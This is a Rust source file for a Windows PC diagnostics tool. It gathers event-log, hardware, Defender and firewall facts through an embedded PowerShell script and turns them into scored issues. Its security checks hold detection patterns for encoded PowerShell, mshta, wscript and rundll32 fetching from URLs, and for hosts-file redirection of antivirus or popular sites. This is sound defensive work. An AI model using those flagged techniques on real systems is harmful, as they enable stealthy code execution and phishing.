//! Smart PC diagnostics: performance, heat, hardware, Windows errors and security
//! (Microsoft Defender + common malware signs). Collects raw facts, then `evaluate` turns them
//! into issues (pure, unit-tested). Texts live in the UI (i18n) — issues carry a code + params.
//! Fixes are a fixed allow-list of safe, mostly reversible actions (`diag_fix`).
use crate::settings::write_json;
use crate::util::{self, env_path, psq, system_root, tr, Res};
use crate::AppState;
use serde::{Deserialize, Serialize};
use std::collections::BTreeMap;
use std::path::{Path, PathBuf};
use std::time::{Duration, Instant, SystemTime, UNIX_EPOCH};
use tauri::{AppHandle, Emitter, Manager, State};

/* ------------------------------------------------------------------ */
/* Raw facts                                                          */
/* ------------------------------------------------------------------ */

#[derive(Deserialize, Serialize, Default, Clone, Debug)]
#[serde(rename_all = "camelCase", default)]
pub struct EventCount {
    pub count: u32,
    pub last: String,
}

#[derive(Deserialize, Serialize, Default, Clone, Debug)]
#[serde(rename_all = "camelCase", default)]
pub struct AppCrash {
    pub app: String,
    pub count: u32,
}

#[derive(Deserialize, Serialize, Default, Clone, Debug)]
#[serde(rename_all = "camelCase", default)]
pub struct Device {
    pub name: String,
    pub code: u32,
}

#[derive(Deserialize, Serialize, Default, Clone, Debug)]
#[serde(rename_all = "camelCase", default)]
pub struct PhysDisk {
    pub name: String,
    pub health: String,
    pub media: String,
    pub wear: Option<f64>,
    pub temp: Option<f64>,
    pub read_errors: Option<f64>,
}

#[derive(Deserialize, Serialize, Default, Clone, Debug)]
#[serde(rename_all = "camelCase", default)]
pub struct ThreatRaw {
    pub name: String,
    pub resources: Vec<String>,
}

impl ThreatRaw {
    /// Potentially unwanted apps and hacking tools: often legit software the user installed on
    /// purpose (cracks, bundlers, keygens) — never removed automatically.
    pub fn is_pua(&self) -> bool {
        let n = self.name.to_lowercase();
        n.starts_with("pua") || n.starts_with("hacktool") || n.starts_with("app:") || n.starts_with("adware") || n.starts_with("program:")
    }
    fn describe(&self) -> String {
        match self.resources.first() {
            Some(r) => format!("{} — {}", self.name, r.split("_->").next().unwrap_or(r).trim_start_matches("file:_")),
            None => self.name.clone(),
        }
    }
}

#[derive(Deserialize, Serialize, Default, Clone, Debug)]
#[serde(rename_all = "camelCase", default)]
pub struct DefenderRaw {
    pub available: bool,
    pub realtime: bool,
    /// -1 = unknown / never.
    pub sig_age_days: i64,
    /// -1 = never scanned.
    pub quick_scan_age_days: i64,
    pub threats: Vec<ThreatRaw>,
    pub recent_detections: u32,
    pub exclusions: Vec<String>,
}

#[derive(Deserialize, Serialize, Default, Clone, Debug)]
#[serde(rename_all = "camelCase", default)]
pub struct TaskRaw {
    pub name: String,
    pub path: String,
    pub exec: String,
    pub args: String,
}

/// Facts gathered by one PowerShell call (event logs, WMI, Defender, storage).
#[derive(Deserialize, Serialize, Default, Clone, Debug)]
#[serde(rename_all = "camelCase", default)]
pub struct PsRaw {
    /// Set by Rust when the PowerShell part really ran. If false, every check that depends on
    /// it is reported as "skipped" instead of guessing (e.g. never claim "no antivirus").
    #[serde(skip)]
    pub ok: bool,
    pub other_firewall: Vec<String>,
    pub shutdowns: EventCount,
    pub bugchecks: EventCount,
    pub whea: EventCount,
    pub disk_errors: EventCount,
    pub ntfs_errors: EventCount,
    pub throttling: EventCount,
    pub wu_failures: EventCount,
    pub app_crashes: Vec<AppCrash>,
    pub devices: Vec<Device>,
    pub disks: Vec<PhysDisk>,
    pub smart_fail: Vec<String>,
    pub thermal_c: Option<f64>,
    pub battery_design: Option<f64>,
    pub battery_full: Option<f64>,
    pub defender: DefenderRaw,
    pub other_av: Vec<String>,
    pub firewall_off: Vec<String>,
    pub tasks: Vec<TaskRaw>,
}

#[derive(Default, Clone, Debug)]
pub struct LocalRaw {
    pub admin: bool,
    pub is_laptop: bool,
    pub cpu_avg: f32,
    pub top_cpu: Vec<String>,
    pub mem_pct: u32,
    pub top_mem: Vec<String>,
    pub uptime_days: u64,
    pub sys_free_pct: u32,
    pub sys_free_bytes: u64,
    pub sys_drive: String,
    pub startup_enabled: u32,
    /// (startup id, display name, reason)
    pub startup_suspicious: Vec<(String, String, String)>,
    /// (path, signer status)
    pub processes_suspicious: Vec<(String, String)>,
    /// (line, redirects a security/update site)
    pub hosts_suspicious: Vec<(String, bool)>,
    pub power_saver: bool,
    pub junk_bytes: u64,
    pub gpu_temp: Option<f64>,
    pub uac_enabled: bool,
    pub wu_disabled: bool,
    pub proxy: Option<String>,
    pub reboot_pending: bool,
    pub defender_scanned: bool,
    /// Monitors running below their best refresh rate: (device, name, current Hz, max Hz).
    pub displays_low: Vec<(String, String, u32, u32)>,
    /// False if Windows reported no monitors (then the check is skipped).
    pub displays_known: bool,
}

/* ------------------------------------------------------------------ */
/* Report                                                             */
/* ------------------------------------------------------------------ */

#[derive(Serialize, Deserialize, Clone, Debug, PartialEq)]
#[serde(rename_all = "camelCase")]
pub struct Issue {
    /// Check code; the UI maps it to a title, explanation and how-to-fix.
    pub code: String,
    pub category: String,
    /// critical | high | medium | low | info
    pub severity: String,
    pub params: BTreeMap<String, String>,
    pub details: Vec<String>,
    /// Safe automatic fix id (see diag_fix), if any.
    pub fix: Option<String>,
    pub fix_args: Vec<String>,
    /// Where to look manually: "nav:<module>[:<tab>]" or "tool:<id>".
    pub open: Option<String>,
}

#[derive(Serialize, Deserialize, Clone, Debug)]
#[serde(rename_all = "camelCase")]
pub struct CheckRow {
    pub code: String,
    pub category: String,
    /// ok | issue | skipped
    pub status: String,
}

#[derive(Serialize, Deserialize, Clone, Debug)]
#[serde(rename_all = "camelCase")]
pub struct Report {
    pub at: u64,
    pub duration_ms: u64,
    pub score: u32,
    pub admin: bool,
    pub defender_scanned: bool,
    pub issues: Vec<Issue>,
    pub checks: Vec<CheckRow>,
}

struct Out {
    issues: Vec<Issue>,
    checks: Vec<CheckRow>,
}

impl Out {
    fn ok(&mut self, code: &str, cat: &str) {
        self.checks.push(CheckRow { code: code.into(), category: cat.into(), status: "ok".into() });
    }
    fn skip(&mut self, code: &str, cat: &str) {
        self.checks.push(CheckRow { code: code.into(), category: cat.into(), status: "skipped".into() });
    }
    #[allow(clippy::too_many_arguments)]
    fn issue(&mut self, code: &str, cat: &str, sev: &str, params: &[(&str, String)], details: Vec<String>, fix: Option<&str>, fix_args: Vec<String>, open: Option<&str>) {
        self.checks.push(CheckRow { code: code.into(), category: cat.into(), status: "issue".into() });
        self.issues.push(Issue {
            code: code.into(),
            category: cat.into(),
            severity: sev.into(),
            params: params.iter().map(|(k, v)| (k.to_string(), v.clone())).collect(),
            details,
            fix: fix.map(String::from),
            fix_args,
            open: open.map(String::from),
        });
    }
}

const GB: u64 = 1024 * 1024 * 1024;

fn gb(b: u64) -> String {
    format!("{:.1}", b as f64 / GB as f64)
}

/// Turns facts into issues. Pure: no system calls (unit-tested).
pub fn evaluate(ps: &PsRaw, l: &LocalRaw) -> (Vec<Issue>, Vec<CheckRow>, u32) {
    let mut o = Out { issues: vec![], checks: vec![] };

    /* ---------- performance ---------- */
    let c = "performance";
    if l.cpu_avg >= 85.0 {
        o.issue("cpu_load", c, if l.cpu_avg >= 95.0 { "high" } else { "medium" }, &[("pct", format!("{:.0}", l.cpu_avg))], l.top_cpu.clone(), None, vec![], Some("nav:system:processes"));
    } else {
        o.ok("cpu_load", c);
    }
    if l.mem_pct >= 90 {
        o.issue("memory", c, if l.mem_pct >= 95 { "high" } else { "medium" }, &[("pct", l.mem_pct.to_string())], l.top_mem.clone(), None, vec![], Some("nav:system:processes"));
    } else {
        o.ok("memory", c);
    }
    // On big drives 9% can still be hundreds of GB: then it is not a problem.
    if (l.sys_free_pct < 10 && l.sys_free_bytes < 50 * GB) || l.sys_free_bytes < 10 * GB {
        let sev = if l.sys_free_pct < 5 || l.sys_free_bytes < 3 * GB { "high" } else { "medium" };
        o.issue("disk_space", c, sev, &[("drive", l.sys_drive.clone()), ("free", gb(l.sys_free_bytes)), ("pct", l.sys_free_pct.to_string())], vec![], Some("cleanup_safe"), vec![], Some("nav:disk"));
    } else {
        o.ok("disk_space", c);
    }
    if l.junk_bytes >= 2 * GB {
        o.issue("junk", c, if l.junk_bytes >= 10 * GB { "medium" } else { "low" }, &[("size", gb(l.junk_bytes))], vec![], Some("cleanup_safe"), vec![], Some("nav:cleanup"));
    } else {
        o.ok("junk", c);
    }
    if l.startup_enabled >= 10 {
        o.issue("startup", c, if l.startup_enabled >= 20 { "medium" } else { "low" }, &[("n", l.startup_enabled.to_string())], vec![], None, vec![], Some("nav:system:startup"));
    } else {
        o.ok("startup", c);
    }
    if l.power_saver && !l.is_laptop {
        o.issue("power_plan", c, "low", &[], vec![], Some("power_balanced"), vec![], None);
    } else {
        o.ok("power_plan", c);
    }
    if l.uptime_days >= 7 {
        o.issue("uptime", c, if l.uptime_days >= 30 { "low" } else { "info" }, &[("days", l.uptime_days.to_string())], vec![], None, vec![], None);
    } else {
        o.ok("uptime", c);
    }
    if !l.displays_known {
        o.skip("refresh_rate", c);
    } else if let Some((_, name, cur, max)) = l.displays_low.first() {
        let details = l.displays_low.iter().map(|(_, n, c, m)| format!("{n}: {c} → {m} Hz")).collect();
        let args = l.displays_low.iter().flat_map(|(d, _, _, m)| [d.clone(), m.to_string()]).collect();
        o.issue("refresh_rate", c, "low", &[("display", name.clone()), ("cur", cur.to_string()), ("max", max.to_string())], details, Some("refresh_max"), args, Some("nav:games"));
    } else {
        o.ok("refresh_rate", c);
    }
    if l.reboot_pending {
        o.issue("reboot_pending", c, "low", &[], vec![], None, vec![], None);
    } else {
        o.ok("reboot_pending", c);
    }

    /* ---------- heat ---------- */
    let c = "thermal";
    match ps.thermal_c {
        // ACPI thermal zones are not always the CPU sensor, so this is never "critical".
        Some(t) if t >= 90.0 => o.issue("cpu_temp", c, "high", &[("temp", format!("{t:.0}"))], vec![], None, vec![], None),
        Some(t) if t >= 80.0 => o.issue("cpu_temp", c, "medium", &[("temp", format!("{t:.0}"))], vec![], None, vec![], None),
        Some(_) => o.ok("cpu_temp", c),
        None => o.skip("cpu_temp", c),
    }
    match l.gpu_temp {
        Some(t) if t >= 87.0 => o.issue("gpu_temp", c, "high", &[("temp", format!("{t:.0}"))], vec![], None, vec![], None),
        Some(t) if t >= 80.0 => o.issue("gpu_temp", c, "medium", &[("temp", format!("{t:.0}"))], vec![], None, vec![], None),
        Some(_) => o.ok("gpu_temp", c),
        None => o.skip("gpu_temp", c),
    }
    // Some laptops log one throttling event per resume, so only many events count.
    if !ps.ok {
        o.skip("throttling", c);
    } else if ps.throttling.count >= 10 {
        o.issue("throttling", c, if ps.throttling.count >= 50 { "high" } else { "medium" }, &[("n", ps.throttling.count.to_string()), ("last", ps.throttling.last.clone())], vec![], None, vec![], None);
    } else if l.admin {
        o.ok("throttling", c);
    } else {
        o.skip("throttling", c);
    }
    match (ps.battery_design, ps.battery_full) {
        (Some(d), Some(f)) if d > 0.0 && f > 0.0 => {
            let health = (f / d * 100.0).min(100.0);
            if health < 60.0 {
                o.issue("battery", c, if health < 40.0 { "high" } else { "medium" }, &[("pct", format!("{health:.0}"))], vec![], None, vec![], None);
            } else {
                o.ok("battery", c);
            }
        }
        _ => {
            if l.is_laptop {
                o.skip("battery", c);
            }
        }
    }

    /* ---------- hardware ---------- */
    let c = "hardware";
    if !ps.ok {
        for code in ["disk_health", "devices", "hw_errors"] {
            o.skip(code, c);
        }
    } else {
    let mut disk_bad: Vec<String> = ps.smart_fail.iter().map(|n| format!("SMART: {n}")).collect();
    let mut disk_warn: Vec<String> = Vec::new();
    for d in &ps.disks {
        // "Unknown" is normal for many NVMe/USB/RAID disks; only Warning/Unhealthy are real problems.
        if d.health.eq_ignore_ascii_case("warning") || d.health.eq_ignore_ascii_case("unhealthy") {
            disk_bad.push(format!("{} — {}", d.name, d.health));
        }
        if let Some(w) = d.wear {
            if w >= 90.0 {
                disk_bad.push(format!("{} — {w:.0}%", d.name));
            } else if w >= 70.0 {
                disk_warn.push(format!("{} — {w:.0}%", d.name));
            }
        }
        if let Some(e) = d.read_errors {
            // Lifetime counter: a few old errors are normal, warn only when there are many.
            if e >= 10.0 {
                disk_warn.push(format!("{} — read errors: {e:.0}", d.name));
            }
        }
    }
    if !disk_bad.is_empty() {
        o.issue("disk_health", c, "critical", &[], disk_bad, None, vec![], None);
    } else if !disk_warn.is_empty() {
        o.issue("disk_health", c, "medium", &[], disk_warn, None, vec![], None);
    } else if ps.disks.is_empty() {
        o.skip("disk_health", c);
    } else {
        o.ok("disk_health", c);
    }
    if !ps.devices.is_empty() {
        let details = ps.devices.iter().take(12).map(|d| format!("{} (code {})", d.name, d.code)).collect();
        o.issue("devices", c, "medium", &[("n", ps.devices.len().to_string())], details, None, vec![], Some("tool:devmgmt"));
    } else {
        o.ok("devices", c);
    }
    if ps.whea.count > 0 {
        o.issue("hw_errors", c, if ps.whea.count >= 5 { "high" } else { "medium" }, &[("n", ps.whea.count.to_string()), ("last", ps.whea.last.clone())], vec![], None, vec![], None);
    } else {
        o.ok("hw_errors", c);
    }
    }

    /* ---------- Windows errors ---------- */
    let c = "system";
    if !ps.ok {
        for code in ["bsod", "shutdowns", "disk_errors", "app_crashes", "update_errors"] {
            o.skip(code, c);
        }
    } else {
    if ps.bugchecks.count > 0 {
        o.issue("bsod", c, if ps.bugchecks.count >= 3 { "high" } else { "medium" }, &[("n", ps.bugchecks.count.to_string()), ("last", ps.bugchecks.last.clone())], vec![], Some("repair_system"), vec![], None);
    } else {
        o.ok("bsod", c);
    }
    if ps.shutdowns.count > 0 {
        o.issue("shutdowns", c, if ps.shutdowns.count >= 3 { "medium" } else { "low" }, &[("n", ps.shutdowns.count.to_string()), ("last", ps.shutdowns.last.clone())], vec![], None, vec![], None);
    } else {
        o.ok("shutdowns", c);
    }
    let disk_ev = ps.disk_errors.count + ps.ntfs_errors.count;
    if disk_ev > 0 {
        let last = if ps.disk_errors.last >= ps.ntfs_errors.last { ps.disk_errors.last.clone() } else { ps.ntfs_errors.last.clone() };
        o.issue("disk_errors", c, if disk_ev >= 5 { "high" } else { "medium" }, &[("n", disk_ev.to_string()), ("last", last)], vec![], None, vec![], None);
    } else {
        o.ok("disk_errors", c);
    }
    let crashes: u32 = ps.app_crashes.iter().map(|a| a.count).sum();
    if crashes >= 3 {
        let details = ps.app_crashes.iter().take(6).map(|a| format!("{} × {}", a.app, a.count)).collect();
        o.issue("app_crashes", c, if crashes >= 15 { "medium" } else { "low" }, &[("n", crashes.to_string())], details, None, vec![], None);
    } else {
        o.ok("app_crashes", c);
    }
    if ps.wu_failures.count > 0 {
        o.issue("update_errors", c, "medium", &[("n", ps.wu_failures.count.to_string()), ("last", ps.wu_failures.last.clone())], vec![], Some("repair_system"), vec![], Some("tool:updates"));
    } else {
        o.ok("update_errors", c);
    }
    }
    if l.wu_disabled {
        o.issue("wu_service", c, "medium", &[], vec![], Some("enable_wu"), vec![], None);
    } else {
        o.ok("wu_service", c);
    }
    if !l.uac_enabled {
        o.issue("uac", c, "high", &[], vec![], Some("enable_uac"), vec![], None);
    } else {
        o.ok("uac", c);
    }

    /* ---------- security ---------- */
    let c = "security";
    let d = &ps.defender;
    let other_av = !ps.other_av.is_empty();
    if !ps.ok {
        for code in ["threats", "defender_off", "signatures", "last_scan", "firewall", "exclusions"] {
            o.skip(code, c);
        }
    } else {
        // Real malware vs. potentially unwanted apps (often installed on purpose): only the
        // former is critical and auto-removable, and only when no PUA would be removed with it
        // (Remove-MpThreat removes every active threat at once).
        let (pua, malware): (Vec<&ThreatRaw>, Vec<&ThreatRaw>) = d.threats.iter().partition(|t| t.is_pua());
        if !malware.is_empty() {
            let fix = if pua.is_empty() { Some("remove_threats") } else { None };
            o.issue("threats", c, "critical", &[("n", malware.len().to_string())], malware.iter().map(|t| t.describe()).collect(), fix, vec![], Some("tool:defender"));
        } else if d.available || l.admin {
            o.ok("threats", c);
        } else {
            o.skip("threats", c);
        }
        if !pua.is_empty() {
            o.issue("pua", c, "medium", &[("n", pua.len().to_string())], pua.iter().map(|t| t.describe()).collect(), None, vec![], Some("tool:defender"));
        }
        if d.available && !d.realtime && !other_av {
            o.issue("defender_off", c, "critical", &[], vec![], None, vec![], Some("tool:defender"));
        } else if !d.available && !other_av {
            o.issue("no_antivirus", c, "critical", &[], vec![], None, vec![], Some("tool:defender"));
        } else {
            o.ok("defender_off", c);
        }
        // When another antivirus is primary, Defender is passive: its age counters don't matter.
        let defender_primary = d.available && !other_av;
        if defender_primary && d.sig_age_days >= 3 {
            o.issue("signatures", c, if d.sig_age_days >= 14 { "high" } else { "medium" }, &[("days", d.sig_age_days.to_string())], vec![], Some("update_signatures"), vec![], None);
        } else if defender_primary {
            o.ok("signatures", c);
        }
        if defender_primary && !l.defender_scanned && d.quick_scan_age_days < 0 {
            o.issue("never_scanned", c, "low", &[], vec![], Some("quick_scan"), vec![], None);
        } else if defender_primary && !l.defender_scanned && d.quick_scan_age_days >= 14 {
            o.issue("last_scan", c, "low", &[("days", d.quick_scan_age_days.to_string())], vec![], Some("quick_scan"), vec![], None);
        } else if defender_primary {
            o.ok("last_scan", c);
        }
        if !ps.firewall_off.is_empty() && ps.other_firewall.is_empty() {
            o.issue("firewall", c, "high", &[], ps.firewall_off.clone(), Some("enable_firewall"), vec![], Some("nav:protection"));
        } else {
            o.ok("firewall", c);
        }
        let real_exclusions: Vec<String> = d
            .exclusions
            .iter()
            .filter(|e| !e.to_lowercase().contains("must be an administrator") && !e.to_lowercase().starts_with("n/a") && !e.trim().is_empty())
            .cloned()
            .collect();
        if !real_exclusions.is_empty() {
            o.issue("exclusions", c, "low", &[("n", real_exclusions.len().to_string())], real_exclusions.into_iter().take(12).collect(), None, vec![], Some("tool:defender"));
        } else {
            o.ok("exclusions", c);
        }
    }
    if !l.startup_suspicious.is_empty() {
        let details = l.startup_suspicious.iter().map(|(_, n, r)| format!("{n} — {r}")).collect();
        let ids = l.startup_suspicious.iter().map(|(id, _, _)| id.clone()).collect();
        o.issue("startup_suspicious", c, "medium", &[("n", l.startup_suspicious.len().to_string())], details, Some("disable_startup"), ids, Some("nav:system:startup"));
    } else {
        o.ok("startup_suspicious", c);
    }
    if !l.processes_suspicious.is_empty() {
        let details = l.processes_suspicious.iter().map(|(p, s)| format!("{p} — {s}")).collect();
        let paths = l.processes_suspicious.iter().map(|(p, _)| p.clone()).collect();
        o.issue("processes_suspicious", c, "medium", &[("n", l.processes_suspicious.len().to_string())], details, Some("scan_files"), paths, Some("nav:system:processes"));
    } else {
        o.ok("processes_suspicious", c);
    }
    if ps.ok {
        let tasks = suspicious_tasks(&ps.tasks);
        if !tasks.is_empty() {
            let details = tasks.iter().map(|t| format!("{}{} — {} {}", t.path, t.name, t.exec, t.args).trim().to_string()).collect();
            o.issue("tasks_suspicious", c, "medium", &[("n", tasks.len().to_string())], details, None, vec![], Some("tool:taskschd"));
        } else {
            o.ok("tasks_suspicious", c);
        }
    } else {
        o.skip("tasks_suspicious", c);
    }
    if !l.hosts_suspicious.is_empty() {
        // Redirecting antivirus/update sites is a strong malware sign; popular sites pointing to
        // other IPs are sometimes intentional (bypass lists), so they're only medium.
        let sev = if l.hosts_suspicious.iter().any(|(_, security)| *security) { "high" } else { "medium" };
        let lines = l.hosts_suspicious.iter().map(|(line, _)| line.clone()).collect();
        o.issue("hosts", c, sev, &[("n", l.hosts_suspicious.len().to_string())], lines, Some("restore_hosts"), vec![], None);
    } else {
        o.ok("hosts", c);
    }
    // A proxy on this PC itself (127.0.0.1 / localhost) is a VPN or proxy client — normal.
    match &l.proxy {
        Some(p) if !is_loopback_proxy(p) => o.issue("proxy", c, "low", &[("server", p.clone())], vec![], Some("disable_proxy"), vec![], None),
        _ => o.ok("proxy", c),
    }
    if ps.ok && d.recent_detections > 0 && d.threats.is_empty() {
        o.issue("past_detections", c, "info", &[("n", d.recent_detections.to_string())], vec![], None, vec![], Some("tool:defender"));
    }

    let score = score_of(&o.issues);
    o.issues.sort_by_key(|i| sev_rank(&i.severity));
    (o.issues, o.checks, score)
}

pub fn sev_rank(s: &str) -> u8 {
    match s {
        "critical" => 0,
        "high" => 1,
        "medium" => 2,
        "low" => 3,
        _ => 4,
    }
}

pub fn score_of(issues: &[Issue]) -> u32 {
    let penalty: i32 = issues
        .iter()
        .map(|i| match i.severity.as_str() {
            "critical" => 25,
            "high" => 12,
            "medium" => 6,
            "low" => 2,
            _ => 0,
        })
        .sum();
    (100 - penalty).clamp(0, 100) as u32
}

/// Scheduled tasks that launch code from user-writable temp/public folders, hidden (encoded)
/// PowerShell, or script hosts / rundll32 pulling from the internet. Vendor tasks that run
/// scripts from Program Files are not flagged.
pub fn suspicious_tasks(tasks: &[TaskRaw]) -> Vec<TaskRaw> {
    tasks
        .iter()
        .filter(|t| {
            let all = crate::icons::expand_env_pub(&format!("{} {}", t.exec, t.args)).to_lowercase();
            let from_temp = all.contains(r"\appdata\local\temp\") || all.contains(r"\windows\temp\") || all.contains(r"\users\public\");
            let encoded = all.contains("powershell") && (all.contains(" -enc ") || all.contains(" -encodedcommand ") || all.contains(" -e "));
            let url = all.contains("http://") || all.contains("https://");
            let script_host = (all.contains("mshta") || all.contains("wscript") || all.contains("cscript")) && url;
            let rundll_url = all.contains("rundll32") && url;
            from_temp || encoded || script_host || rundll_url
        })
        .cloned()
        .collect()
}

pub fn is_loopback_proxy(p: &str) -> bool {
    let l = p.to_lowercase();
    // "127.0.0.1:10809", "localhost:7890", "http=127.0.0.1:8080;https=127.0.0.1:8080", "[::1]:1080"
    l.split(';').all(|part| {
        let host = part.split('=').next_back().unwrap_or("").trim().trim_start_matches("http://").trim_start_matches("socks=").to_string();
        host.starts_with("127.") || host.starts_with("localhost") || host.starts_with("[::1]") || host.starts_with("::1")
    })
}

/// Startup entries that look like malware: run from Temp/Downloads/Public, point to a missing
/// file, or launch script hosts / encoded PowerShell.
pub fn startup_reason(command: &str, exe: Option<&str>) -> Option<&'static str> {
    let c = command.to_lowercase();
    if c.contains(r"\appdata\local\temp\") || c.contains(r"\windows\temp\") {
        return Some("temp");
    }
    if c.contains(r"\downloads\") {
        return Some("downloads");
    }
    if c.contains(r"\users\public\") {
        return Some("public");
    }
    if c.contains("-encodedcommand") || c.contains(" -enc ") || (c.contains("mshta") && c.contains("http")) || (c.contains("wscript") && c.contains(".vbs")) {
        return Some("script");
    }
    if let Some(e) = exe {
        let p = Path::new(e);
        if p.is_absolute() && e.to_lowercase().ends_with(".exe") && !p.exists() {
            return Some("missing");
        }
    }
    None
}

/// Exact domains (a host matches the domain itself or any subdomain of it — whole labels only).
const SECURITY_DOMAINS: &[&str] = &[
    "kaspersky.com", "kaspersky.ru", "eset.com", "esetnod32.ru", "drweb.com", "drweb.ru", "avast.com", "avg.com",
    "malwarebytes.com", "virustotal.com", "bitdefender.com", "norton.com", "mcafee.com", "sophos.com",
    "windowsupdate.com", "update.microsoft.com", "definitionupdates.microsoft.com", "wdcp.microsoft.com",
    "wd.microsoft.com",
];

const POPULAR_DOMAINS: &[&str] = &[
    "google.com", "youtube.com", "vk.com", "ok.ru", "mail.ru", "yandex.ru", "ya.ru", "facebook.com", "instagram.com",
    "steamcommunity.com", "steampowered.com", "discord.com", "paypal.com", "sberbank.ru", "tinkoff.ru", "microsoft.com",
    "live.com", "outlook.com", "github.com", "twitter.com", "x.com", "telegram.org", "web.telegram.org", "roblox.com",
];

/// Lines in the hosts file that redirect security sites (to anything) or popular sites to a
/// non-loopback address — the classic tricks of malware and phishing.
fn domain_match(host: &str, domains: &[&str]) -> bool {
    domains.iter().any(|d| host == *d || host.ends_with(&format!(".{d}")))
}

/// Suspicious hosts lines as (trimmed line, is_security_site).
pub fn hosts_suspicious(text: &str) -> Vec<(String, bool)> {
    let mut out = Vec::new();
    for line in text.lines() {
        let l = line.split('#').next().unwrap_or("").trim();
        if l.is_empty() {
            continue;
        }
        let mut parts = l.split_whitespace();
        let Some(ip) = parts.next() else { continue };
        let loopback = ip == "127.0.0.1" || ip == "0.0.0.0" || ip == "::1" || ip == "::";
        for host in parts {
            let h = host.trim_end_matches('.').to_lowercase();
            if domain_match(&h, SECURITY_DOMAINS) {
                out.push((line.trim().to_string(), true));
                break;
            }
            if !loopback && domain_match(&h, POPULAR_DOMAINS) {
                out.push((line.trim().to_string(), false));
                break;
            }
        }
    }
    out
}

/* ------------------------------------------------------------------ */
/* Collection                                                         */
/* ------------------------------------------------------------------ */

pub(crate) const PS_SCRIPT: &str = r#"
function EvCount($log, $ids, $days, $providers) {
  # Level 1-3 = critical, error, warning. Informational records ("volume is healthy") are ignored.
  $h = @{ LogName = $log; StartTime = (Get-Date).AddDays(-$days); Level = @(1,2,3) }
  if ($ids) { $h.Id = $ids }
  if ($providers) { $h.ProviderName = $providers }
  $e = @()
  try { $e = @(Get-WinEvent -FilterHashtable $h -MaxEvents 200 -ErrorAction Stop) } catch {}
  [pscustomobject]@{ count = $e.Count; last = $(if ($e.Count -gt 0) { $e[0].TimeCreated.ToString('yyyy-MM-dd HH:mm') } else { '' }) }
}
$r = [ordered]@{}
$r.shutdowns = EvCount 'System' @(41) 30 @('Microsoft-Windows-Kernel-Power')
$r.bugchecks = EvCount 'System' @(1001) 30 @('Microsoft-Windows-WER-SystemErrorReporting')
$r.whea = EvCount 'System' $null 30 @('Microsoft-Windows-WHEA-Logger')
$r.diskErrors = EvCount 'System' @(7,11,51,153) 30 @('disk')
$r.ntfsErrors = EvCount 'System' @(55,98) 30 @('Ntfs','Microsoft-Windows-Ntfs')
$r.throttling = EvCount 'System' @(37) 7 @('Microsoft-Windows-Kernel-Processor-Power')
# (a single missing provider makes a query return 0 — every query has its own try)
$r.wuFailures = EvCount 'System' @(20) 30 @('Microsoft-Windows-WindowsUpdateClient')
$crash = @()
try {
  $crash = @(Get-WinEvent -FilterHashtable @{ LogName = 'Application'; Id = 1000; ProviderName = 'Application Error'; StartTime = (Get-Date).AddDays(-7) } -MaxEvents 300 -ErrorAction Stop |
    ForEach-Object { [string]$_.Properties[0].Value } | Group-Object | Sort-Object Count -Descending | Select-Object -First 8 |
    ForEach-Object { [pscustomobject]@{ app = $_.Name; count = $_.Count } })
} catch {}
$r.appCrashes = $crash
$r.devices = @()
try { $r.devices = @(Get-CimInstance Win32_PnPEntity -Filter 'ConfigManagerErrorCode <> 0' -ErrorAction Stop | Where-Object { $_.ConfigManagerErrorCode -notin 22,45 } | ForEach-Object { [pscustomobject]@{ name = [string]$_.Name; code = [int]$_.ConfigManagerErrorCode } }) } catch {}
$r.disks = @()
try {
  $r.disks = @(Get-PhysicalDisk -ErrorAction Stop | ForEach-Object {
    $rc = $null; try { $rc = $_ | Get-StorageReliabilityCounter -ErrorAction Stop } catch {}
    [pscustomobject]@{ name = [string]$_.FriendlyName; health = [string]$_.HealthStatus; media = [string]$_.MediaType;
      wear = $(if ($rc) { $rc.Wear } else { $null }); temp = $(if ($rc) { $rc.Temperature } else { $null }); readErrors = $(if ($rc) { $rc.ReadErrorsUncorrected } else { $null }) } })
} catch {}
$r.smartFail = @()
try { $r.smartFail = @(Get-CimInstance -Namespace root/wmi -ClassName MSStorageDriver_FailurePredictStatus -ErrorAction Stop | Where-Object { $_.PredictFailure } | ForEach-Object { [string]$_.InstanceName }) } catch {}
$r.thermalC = $null
try {
  $t = @(Get-CimInstance -Namespace root/wmi -ClassName MSAcpi_ThermalZoneTemperature -ErrorAction Stop | ForEach-Object { ($_.CurrentTemperature / 10) - 273.15 } | Where-Object { $_ -gt 10 -and $_ -lt 120 })
  if ($t.Count -gt 0) { $r.thermalC = ($t | Measure-Object -Maximum).Maximum }
} catch {}
$r.batteryDesign = $null; $r.batteryFull = $null
try { $r.batteryDesign = (Get-CimInstance -Namespace root/wmi -ClassName BatteryStaticData -ErrorAction Stop | Select-Object -First 1).DesignedCapacity } catch {}
try { $r.batteryFull = (Get-CimInstance -Namespace root/wmi -ClassName BatteryFullChargedCapacity -ErrorAction Stop | Select-Object -First 1).FullChargedCapacity } catch {}
function Days($v) { try { $n = [long]$v; if ($n -lt 0 -or $n -gt 100000) { -1 } else { $n } } catch { -1 } }
$d = [ordered]@{ available = $false; realtime = $false; sigAgeDays = -1; quickScanAgeDays = -1; threats = @(); recentDetections = 0; exclusions = @() }
$mp = $null
try { $mp = Get-MpComputerStatus -ErrorAction Stop } catch {}
if ($mp) {
  try { $d.available = [bool]$mp.AMServiceEnabled } catch {}
  try { $d.realtime = [bool]$mp.RealTimeProtectionEnabled } catch {}
  $d.sigAgeDays = Days $mp.AntivirusSignatureAge
  $d.quickScanAgeDays = Days $mp.QuickScanAge
  try { $d.threats = @(Get-MpThreat -ErrorAction Stop | Where-Object { $_.IsActive } | ForEach-Object { [pscustomobject]@{ name = [string]$_.ThreatName; resources = @(@($_.Resources) | Select-Object -First 3 | ForEach-Object { [string]$_ }) } }) } catch {}
  try { $d.recentDetections = @(Get-MpThreatDetection -ErrorAction Stop | Where-Object { $_.InitialDetectionTime -gt (Get-Date).AddDays(-30) }).Count } catch {}
  try { $p = Get-MpPreference -ErrorAction Stop; $d.exclusions = @(@($p.ExclusionPath) + @($p.ExclusionProcess) + @($p.ExclusionExtension) | Where-Object { $_ } | ForEach-Object { [string]$_ }) } catch {}
}
$r.defender = [pscustomobject]$d
$r.otherAv = @()
try { $r.otherAv = @(Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct -ErrorAction Stop | Where-Object { $_.displayName -notmatch '^(Windows|Microsoft) Defender' -and ((([int]$_.productState) -band 0x1000) -ne 0) } | ForEach-Object { [string]$_.displayName }) } catch {}
$r.otherFirewall = @()
